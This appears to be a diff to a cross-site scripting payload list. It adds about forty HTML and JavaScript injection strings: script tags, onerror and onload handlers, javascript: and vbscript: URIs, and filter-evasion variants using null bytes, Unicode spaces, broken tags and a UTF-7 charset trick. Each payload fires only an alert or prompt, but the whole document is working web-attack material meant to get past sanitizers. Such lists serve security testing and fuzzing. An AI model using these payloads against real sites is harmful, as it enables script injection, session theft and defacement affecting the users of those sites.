@@ -1,4 +1,45 @@
 <script>alert("Xploit")</script>
-<script>alert("hello")</script>
-<script>alert("hub")</script>
 <image/src/onerror=prompt(8)>
+<img/src/onerror=prompt(8)>
+<image src/onerror=prompt(8)>
+<img src/onerror=prompt(8)>
+<image src =q onerror=prompt(8)>
+<img src =q onerror=prompt(8)>
+</scrip</script>t><img src =q onerror=prompt(8)>
+<script\x20type="text/javascript">javascript:alert(1);</script>
+<script\x3Etype="text/javascript">javascript:alert(1);</script>
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
+<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
+<video src=1 href=1 onerror="javascript:alert(1)"></video>
+<body src=1 href=1 onerror="javascript:alert(1)"></body>
+<image src=1 href=1 onerror="javascript:alert(1)"></image>
+<object src=1 href=1 onerror="javascript:alert(1)"></object>
+<script src=1 href=1 onerror="javascript:alert(1)"></script>
+<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
+<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
+<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
+<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
+<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
+<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x07cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>
+script>if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}</script>
+<script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}</script>
+<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+"`'><script>\xE2\x80\xAFjavascript:alert(1)</script>
+"`'><script>\xE2\x80\x89javascript:alert(1)</script>
+"`'><script>\xE2\x80\x85javascript:alert(1)</script>
+"`'><script>\xE2\x80\x88javascript:alert(1)</script>
+<image src="javascript:alert(1)">
+<script src="javascript:alert(1)">
+<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x
+<? foo="><script>javascript:alert(1)</script>">
+<! foo="><script>javascript:alert(1)</script>"><div id="x">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>
+<x style="background:url('x&#1;;color:red;/*')">XXX</x>
+<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>
+<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>
+<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>
+<link rel="stylesheet" href="javascript:document.vulnerable=true;">
+<iframe src="vbscript:document.vulnerable=true;">
